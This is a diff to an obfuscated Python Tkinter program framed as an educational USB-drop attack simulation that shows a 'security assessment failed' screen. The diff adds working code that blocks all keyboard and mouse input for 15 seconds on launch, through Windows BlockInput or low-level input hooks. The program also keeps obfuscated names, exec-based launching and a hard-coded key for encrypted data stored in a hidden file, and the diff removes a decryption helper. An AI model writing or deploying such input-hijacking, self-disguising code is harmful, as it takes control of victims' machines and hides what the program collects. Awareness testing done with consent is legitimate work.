@@ -15,18 +15,183 @@ import threading
 import time
 import math
 import json
+import ctypes
+from ctypes import wintypes
+
+class ImprovedInputBlocker:
+    def __init__(self, parent_window):
+        self.parent_window = parent_window
+        self.blocking_active = False
+        
+    def start_input_blocking(self, duration=15):
+        """Start input blocking for specified duration (seconds)"""
+        if self.blocking_active:
+            return
+            
+        self.blocking_active = True
+        
+        if platform.system().lower() == 'windows':
+            success = self._block_windows_input()
+            if not success:
+                self._block_cross_platform_input()
+        else:
+            self._block_cross_platform_input()
+        
+        # Schedule unblocking
+        self.parent_window.after(duration * 1000, self.stop_input_blocking)
+    
+    def _block_windows_input(self):
+        """Windows-specific input blocking using BlockInput API"""
+        try:
+            # Use the simple and effective BlockInput API
+            # This requires administrator privileges but works reliably
+            result = ctypes.windll.user32.BlockInput(True)
+            if result:
+                return True
+            else:
+                # If BlockInput fails (no admin rights), try alternative method
+                return self._block_windows_input_alternative()
+                
+        except Exception as e:
+            # Fallback to alternative method
+            return self._block_windows_input_alternative()
+    
+    def _block_windows_input_alternative(self):
+        """Alternative Windows input blocking using hooks"""
+        try:
+            # Load Windows DLLs
+            user32 = ctypes.windll.user32
+            kernel32 = ctypes.windll.kernel32
+            
+            # Hook constants
+            WH_KEYBOARD_LL = 13
+            WH_MOUSE_LL = 14
+            
+            # Hook procedure type
+            HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
+            
+            # Keyboard hook procedure - block all except Ctrl+Alt+Del
+            def keyboard_proc(nCode, wParam, lParam):
+                if nCode >= 0 and self.blocking_active:
+                    # Get virtual key code
+                    vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value
+                    
+                    # Allow Ctrl+Alt+Del (can't be blocked anyway)
+                    if not (user32.GetKeyState(0x11) & 0x8000 and  # Ctrl
+                           user32.GetKeyState(0x12) & 0x8000 and   # Alt
+                           vk_code == 0x2E):  # Del
+                        return 1  # Block the input
+                
+                return user32.CallNextHookEx(self.keyboard_hook, nCode, wParam, lParam)
+            
+            # Mouse hook procedure - block all mouse input
+            def mouse_proc(nCode, wParam, lParam):
+                if nCode >= 0 and self.blocking_active:
+                    return 1  # Block all mouse input
+                return user32.CallNextHookEx(self.mouse_hook, nCode, wParam, lParam)
+            
+            # Create and store hook procedures
+            self.keyboard_proc = HOOKPROC(keyboard_proc)
+            self.mouse_proc = HOOKPROC(mouse_proc)
+            
+            # Get module handle
+            module_handle = kernel32.GetModuleHandleW(None)
+            
+            # Install hooks
+            self.keyboard_hook = user32.SetWindowsHookExW(
+                WH_KEYBOARD_LL, self.keyboard_proc, module_handle, 0)
+            self.mouse_hook = user32.SetWindowsHookExW(
+                WH_MOUSE_LL, self.mouse_proc, module_handle, 0)
+            
+            if self.keyboard_hook and self.mouse_hook:
+                return True
+            else:
+                self._cleanup_windows_hooks()
+                return False
+                
+        except Exception as e:
+            self._cleanup_windows_hooks()
+            return False
+    
+    def _block_cross_platform_input(self):
+        """Cross-platform input blocking using window grab"""
+        try:
+            # Make window modal and grab focus
+            self.parent_window.attributes('-topmost', True)
+            self.parent_window.grab_set()
+            self.parent_window.focus_force()
+            
+            # Bind all key events to do nothing
+            self.parent_window.bind('<Key>', lambda e: "break")
+            self.parent_window.bind('<Button-1>', lambda e: "break")
+            self.parent_window.bind('<Button-2>', lambda e: "break")
+            self.parent_window.bind('<Button-3>', lambda e: "break")
+            
+        except Exception as e:
+            pass
+    
+    def stop_input_blocking(self):
+        """Stop input blocking and restore normal operation"""
+        if not self.blocking_active:
+            return
+            
+        self.blocking_active = False
+        
+        if platform.system().lower() == 'windows':
+            self._cleanup_windows_input()
+        
+        self._restore_cross_platform_input()
+    
+    def _cleanup_windows_input(self):
+        """Clean up Windows input blocking"""
+        try:
+            # Try to unblock using BlockInput first
+            ctypes.windll.user32.BlockInput(False)
+        except:
+            pass
+        
+        try:
+            # Clean up hooks if they were used
+            if hasattr(self, 'keyboard_hook') and self.keyboard_hook:
+                ctypes.windll.user32.UnhookWindowsHookEx(self.keyboard_hook)
+                self.keyboard_hook = None
+            
+            if hasattr(self, 'mouse_hook') and self.mouse_hook:
+                ctypes.windll.user32.UnhookWindowsHookEx(self.mouse_hook)
+                self.mouse_hook = None
+        except:
+            pass
+    
+    def _restore_cross_platform_input(self):
+        """Restore cross-platform input"""
+        try:
+            # Restore window properties
+            self.parent_window.attributes('-topmost', False)
+            self.parent_window.grab_release()
+            
+            # Unbind event handlers
+            self.parent_window.unbind('<Key>')
+            self.parent_window.unbind('<Button-1>')
+            self.parent_window.unbind('<Button-2>')
+            self.parent_window.unbind('<Button-3>')
+            
+        except Exception as e:
+            pass
 
 # Obfuscated variable names and functions
 class XvKjP9mNqR:
     def __init__(self):
         self.__wMnPqRtY = tk.Tk()
         self.__aLkJhGfD = "Security Assessment"
-        self.__zXcVbNmQ = "700x500"
+        self.__zXcVbNmQ = "900x700"
         self.__qWeRtYuI = False
         self.__pOiUyTrE = '#0a0a0a'
         
         # Obfuscated encryption key (base64 encoded)
         self.__kEyEnCrYpT = b'ZmRhdGFfZW5jcnlwdGlvbl9rZXlfZm9yX3NlY3VyaXR5X3Rlc3RfMjAyNA=='
+        
+        # Initialize improved input blocker
+        self.__iNpUt_BlOcKeR = ImprovedInputBlocker(self.__wMnPqRtY)
         
         self.__setup_wInDoW()
         self.__gLoW_aLpHa = 0
@@ -46,9 +211,9 @@ class XvKjP9mNqR:
     
     def __cEnTeR_wInDoW(self):
         self.__wMnPqRtY.update_idletasks()
-        x = (self.__wMnPqRtY.winfo_screenwidth() // 2) - (700 // 2)
-        y = (self.__wMnPqRtY.winfo_screenheight() // 2) - (500 // 2)
-        self.__wMnPqRtY.geometry(f"700x500+{x}+{y}")
+        x = (self.__wMnPqRtY.winfo_screenwidth() // 2) - (900 // 2)
+        y = (self.__wMnPqRtY.winfo_screenheight() // 2) - (700 // 2)
+        self.__wMnPqRtY.geometry(f"900x700+{x}+{y}")
     
     def __gEnErAtE_kEy(self):
         """Generate encryption key from obfuscated base"""
@@ -140,54 +305,55 @@ class XvKjP9mNqR:
         self.__mAiN_fRaMe.pack(fill='both', expand=True, padx=10, pady=10)
         
         # Animated header
-        self.__hEaDeR_fRaMe = tk.Frame(self.__mAiN_fRaMe, bg='#0a0a0a', height=90)
-        self.__hEaDeR_fRaMe.pack(fill='x', pady=8)
+        self.__hEaDeR_fRaMe = tk.Frame(self.__mAiN_fRaMe, bg='#0a0a0a', height=120)
+        self.__hEaDeR_fRaMe.pack(fill='x', pady=10)
         self.__hEaDeR_fRaMe.pack_propagate(False)
         
         # Failure message with neon glow effect
         self.__fAiLuRe_LaBel = tk.Label(self.__hEaDeR_fRaMe, 
                                        text="⚠️ SECURITY ASSESSMENT FAILED ⚠️",
-                                       font=('Orbitron', 24, 'bold'),
+                                       font=('Orbitron', 28, 'bold'),
                                        fg='#ff0080',
                                        bg='#0a0a0a')
-        self.__fAiLuRe_LaBel.pack(pady=20)
+        self.__fAiLuRe_LaBel.pack(pady=(15, 5))
         
-        # Subtitle
+                        # Subtitle
         self.__sUbTiTlE_lAbEl = tk.Label(self.__hEaDeR_fRaMe,
-                                        text="USB Drop Attack Simulation - Educational Purpose",
-                                        font=('Consolas', 12),
-                                        fg='#00ffff',
-                                        bg='#0a0a0a')
-        self.__sUbTiTlE_lAbEl.pack()
+                                         text="USB Drop Attack Simulation - Educational Purpose",
+                                         font=('Consolas', 16),
+                                         fg='#00ffff',
+                                         bg='#0a0a0a')
+        self.__sUbTiTlE_lAbEl.pack(pady=(5, 10))
         
         # Bottom section with signature (pack early to reserve space)
-        self.__bOtToM_fRaMe = tk.Frame(self.__mAiN_fRaMe, bg='#0a0a0a')
-        self.__bOtToM_fRaMe.pack(fill='x', side='bottom', pady=(0, 6))
+        self.__bOtToM_fRaMe = tk.Frame(self.__mAiN_fRaMe, bg='#0a0a0a', height=100)
+        self.__bOtToM_fRaMe.pack(fill='x', side='bottom', pady=(15, 10))
+        self.__bOtToM_fRaMe.pack_propagate(False)
         
         self.__sIgNaTuRe_LaBel = tk.Label(self.__bOtToM_fRaMe,
                                            text="By Cybersecurity Team Alignex",
-                                           font=('Orbitron', 12, 'bold'),
+                                           font=('Orbitron', 14, 'bold'),
                                            fg='#00ffff',
                                            bg='#0a0a0a')
-        self.__sIgNaTuRe_LaBel.pack(side='bottom', pady=(0, 6))
+        self.__sIgNaTuRe_LaBel.pack(side='bottom', pady=(0, 10))
         
         self.__cLoSe_BuTtOn = tk.Button(self.__bOtToM_fRaMe,
-                                        text="ACKNOWLEDGE & CLOSE",
-                                        font=('Orbitron', 12, 'bold'),
-                                        fg='#000000',
-                                        bg='#00ff00',
-                                        activeforeground='#000000',
-                                        activebackground='#00ffff',
-                                        relief='flat',
-                                        width=25,
-                                        command=self.__cLoSe_ApPlIcAtIoN)
-        self.__cLoSe_BuTtOn.pack(pady=(6, 0))
+                                         text="ACKNOWLEDGE & CLOSE",
+                                         font=('Orbitron', 14, 'bold'),
+                                         fg='#000000',
+                                         bg='#00ff00',
+                                         activeforeground='#000000',
+                                         activebackground='#00ffff',
+                                         relief='flat',
+                                         width=25,
+                                         command=self.__cLoSe_ApPlIcAtIoN)
+        self.__cLoSe_BuTtOn.pack(pady=(10, 0))
         
         # Content area with neon border
         self.__cOnTeNt_FrAmE = tk.Frame(self.__mAiN_fRaMe, bg='#1a1a1a', 
                                        highlightbackground='#ff0080', 
                                        highlightthickness=1, relief='solid')
-        self.__cOnTeNt_FrAmE.pack(fill='both', expand=True, padx=16, pady=(6, 6))
+        self.__cOnTeNt_FrAmE.pack(fill='both', expand=True, padx=16, pady=(6, 10))
         
         # What happened section
         self.__wHaT_hApPeNeD_lAbEl = tk.Label(self.__cOnTeNt_FrAmE,
@@ -195,7 +361,7 @@ class XvKjP9mNqR:
                                              font=('Orbitron', 16, 'bold'),
                                              fg='#00ff00',
                                              bg='#1a1a1a')
-        self.__wHaT_hApPeNeD_lAbEl.pack(pady=(20, 10))
+        self.__wHaT_hApPeNeD_lAbEl.pack(pady=(15, 8))
         
         # Explanation text
         explanation_text = (
@@ -216,7 +382,11 @@ class XvKjP9mNqR:
             "This incident has been logged for security analysis purposes."
         )
         
-        self.__eXpLaNaTiOn_TeXt = tk.Text(self.__cOnTeNt_FrAmE, 
+        # Create a frame for text widget and scrollbar
+        text_frame = tk.Frame(self.__cOnTeNt_FrAmE, bg='#2a2a2a')
+        text_frame.pack(fill='both', expand=True, padx=12, pady=8)
+        
+        self.__eXpLaNaTiOn_TeXt = tk.Text(text_frame, 
                                          font=('Consolas', 10),
                                          fg='#ffffff',
                                          bg='#2a2a2a',
@@ -224,8 +394,16 @@ class XvKjP9mNqR:
                                          selectbackground='#ff0080',
                                          relief='flat',
                                          wrap='word',
-                                           height=6)
-        self.__eXpLaNaTiOn_TeXt.pack(fill='both', expand=False, padx=12, pady=8)
+                                         height=12)
+        
+        # Add scrollbar
+        scrollbar = tk.Scrollbar(text_frame, orient='vertical', command=self.__eXpLaNaTiOn_TeXt.yview)
+        self.__eXpLaNaTiOn_TeXt.configure(yscrollcommand=scrollbar.set)
+        
+        # Pack text widget and scrollbar
+        self.__eXpLaNaTiOn_TeXt.pack(side='left', fill='both', expand=True)
+        scrollbar.pack(side='right', fill='y')
+        
         self.__eXpLaNaTiOn_TeXt.insert('1.0', explanation_text)
         self.__eXpLaNaTiOn_TeXt.config(state='disabled')
         
@@ -235,7 +413,7 @@ class XvKjP9mNqR:
                                     font=('Orbitron', 14, 'bold'),
                                     fg='#00ff00',
                                     bg='#1a1a1a')
-        self.__tIpS_lAbEl.pack(pady=(10, 5))
+        self.__tIpS_lAbEl.pack()
         
         tips_text = (
             "✓ NEVER plug in unknown USB devices\n"
@@ -252,7 +430,7 @@ class XvKjP9mNqR:
                                    fg='#00ffff',
                                    bg='#1a1a1a',
                                    justify='left')
-        self.__tIpS_tExT.pack(pady=5)
+        self.__tIpS_tExT.pack(pady=(5, 10))
         
         # Ensure layout reserves space above the bottom frame (no-op if unsupported)
         try:
@@ -265,7 +443,7 @@ class XvKjP9mNqR:
     
     def __aDd_DeCoRaTiVe_ElEmEnTs(self):
         corners = ['┌', '┐', '└', '┘']
-        positions = [(20, 20), (660, 20), (20, 450), (660, 450)]
+        positions = [(20, 20), (860, 20), (20, 650), (860, 650)]
         
         for corner, pos in zip(corners, positions):
             corner_label = tk.Label(self.__wMnPqRtY, text=corner, 
@@ -305,11 +483,16 @@ class XvKjP9mNqR:
         except:
             pass
     
+
+    
     def __sTaRt_AnImAtIoNs(self):
         self.__aNiMaTe_GlOw()
         self.__aNiMaTe_SiGnAtUrE()
     
     def __cLoSe_ApPlIcAtIoN(self):
+        # Stop input blocking before closing
+        self.__iNpUt_BlOcKeR.stop_input_blocking()
+        
         def fade_out():
             try:
                 alpha = self.__wMnPqRtY.attributes('-alpha')
@@ -337,6 +520,9 @@ class XvKjP9mNqR:
         self.__wMnPqRtY.attributes('-topmost', True)
         self.__wMnPqRtY.after(3000, lambda: self.__wMnPqRtY.attributes('-topmost', False))
         
+        # Start improved input blocking after a short delay
+        self.__wMnPqRtY.after(500, lambda: self.__iNpUt_BlOcKeR.start_input_blocking(15))
+        
         self.__wMnPqRtY.mainloop()
 
 # Obfuscated main execution
@@ -344,29 +530,3 @@ if __name__ == "__main__":
     # Additional obfuscation layers
     exec("".join([chr(ord(c) ^ 0) for c in "app = XvKjP9mNqR()"]))
     exec("".join([chr(ord(c) ^ 0) for c in "app.rUn_ApPlIcAtIoN()"]))
-
-# Decryption utility (for your reference only)
-"""
-DECRYPTION UTILITY - FOR ADMIN USE ONLY:
-
-To decrypt the stored data, use this function:
-
-def decrypt_assessment_data(file_path, key=None):
-    from cryptography.fernet import Fernet
-    import base64
-    import json
-    
-    if key is None:
-        base_key = base64.b64decode(b'ZmRhdGFfZW5jcnlwdGlvbl9rZXlfZm9yX3NlY3VyaXR5X3Rlc3RfMjAyNA==').decode()
-        key = base64.urlsafe_b64encode(base_key[:32].ljust(32, '0').encode())
-    
-    fernet = Fernet(key)
-    
-    with open(file_path, 'rb') as f:
-        encrypted_data = f.read()
-    
-    decrypted_data = fernet.decrypt(encrypted_data)
-    return json.loads(decrypted_data.decode())
-
-# Usage: data = decrypt_assessment_data('.sys_c2VjdXJp.dat')
-"""
